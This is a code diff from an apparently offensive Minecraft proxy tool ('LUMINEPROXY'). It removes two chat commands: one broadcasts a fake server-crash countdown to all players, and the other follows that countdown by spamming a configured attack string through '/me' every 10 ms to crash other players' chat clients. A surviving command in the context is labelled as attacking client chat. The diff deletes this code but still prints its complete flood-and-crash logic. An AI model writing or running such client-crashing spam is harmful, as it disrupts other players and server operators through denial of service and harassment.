@@ -128,38 +128,6 @@ export default class Read {
 				}, "正在攻击客户端聊天…");
 			}),
 
-			Command.create("c:count", "聊天室倒计时")
-			.setFunc((_) => {
-				let count = 10;
-				Read.startSpam(1_000, () => {
-					if (count <= 0) {
-						clearInterval(Current.get("loop"));
-						console.log("< 倒计时结束");
-						return;
-					}
-					Current.client.tellAll(`§uLUMINEPROXY TOP! §l§cTHIS SERVER WILL CRASH IN ${count} SECONDS!`);
-					count -= 1;
-				}, "正在进行倒计时…");
-			}),
-
-			Command.create("c:crash", "崩溃客户端聊天")
-			.setFunc((_) => {
-				let count = 10;
-				Read.startSpam(1_000, () => {
-					if (count <= 0) {
-						clearInterval(Current.get("loop"));
-						console.log("< 正在进行崩溃…");
-						// 倒计时结束后启动攻击
-						Read.startSpam(10, () => {
-							Current.client.sendCommand(`me ${Read.replaceZeros(config.spam.attack)}`);
-						}, "正在进行崩溃攻击…");
-						return;
-					}
-					Current.client.tellAll(`§uLUMINEPROXY TOP! §l§cTHIS SERVER WILL CRASH IN ${count} SECONDS!`);
-					count -= 1;
-				}, "正在进行倒计时…");
-			}),
-
 			Command.create("c:clear", "清屏聊天消息")
 			.setFunc((_) => {
 				Read.startSpam(50, () => {
